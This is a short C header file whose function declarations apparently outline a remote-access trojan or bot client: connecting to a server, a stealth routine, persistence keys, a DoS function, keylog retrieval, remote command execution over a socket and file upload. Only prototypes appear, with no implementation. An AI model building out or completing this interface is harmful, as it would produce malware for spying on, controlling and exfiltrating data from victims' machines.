#ifndef UTILS_H_INCLUDED
#define UTILS_H_INCLUDED

int create_conn(int sock, char *server_ip, int server_port);
void hostname_to_ip(char *address, char *ip);
void stealth();
int create_key(char *path);
int test_key(void );
void hdos_exe(char *address);
int get_keylog();
int exec_command(char *command, int sock);
void upload();

#endif
